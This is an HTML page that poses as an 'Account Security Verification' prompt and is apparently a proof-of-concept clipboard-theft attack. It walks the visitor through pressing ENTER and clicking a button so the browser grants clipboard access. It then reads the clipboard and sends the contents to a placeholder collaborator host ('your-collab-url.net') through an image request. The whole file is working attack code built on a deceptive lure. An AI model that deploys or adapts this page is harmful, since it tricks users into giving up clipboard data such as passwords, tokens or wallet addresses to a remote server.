<!DOCTYPE html>
<html>
<head>
  <title>Hybrid Gesture Validation</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      margin-top: 30px;
      cursor: pointer;
    }
    #msg {
      margin-top: 20px;
      font-size: 16px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
      color: green;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>

  <h2>Account Security Verification</h2>
  <div id="msg">Press ENTER to begin the verification process...</div>
  <button id="btn" style="display:none;">
    Continue Verification ‚Äî Click this button, then hit ENTER repeatedly and quickly
  </button>
  <div id="result"></div>

  <script>
    let stage = 0;
    let triggered = false;

    document.addEventListener("keydown", (e) => {
      if (e.key !== "Enter") return;

      if (stage === 0) {
        stage = 1;
        document.getElementById("msg").innerText =
          "‚úÖ Step 1: Keyboard gesture detected.\nNow click the button below.";
        document.getElementById("btn").style.display = "inline-block";
      } else if (stage === 2) {
        document.getElementById("msg").innerText = "‚úÖ Verification complete.";
        document.getElementById("result").innerText =
          "Thank you for completing the verification!";
      }
    });

    document.getElementById("btn").addEventListener("click", () => {
      if (stage === 1 && !triggered) {
        triggered = true;
        stage = 2;

        document.getElementById("msg").innerText = "üìã Reading clipboard...";

        navigator.clipboard.readText()
          .then(text => {
            document.getElementById("result").innerText = "üìã Clipboard:\n" + text;

            // Optional: exfiltration
            const img = new Image();
            img.src = "https://your-collab-url.net/log?clip=" + encodeURIComponent(text);

            document.getElementById("msg").innerText =
              "‚úÖ Clipboard successfully read.\nPress ENTER again to finish.";
          })
          .catch(err => {
            document.getElementById("msg").innerText = "‚ùå Failed to read clipboard: " + err;
          });
      }
    });
  </script>

</body>
</html>
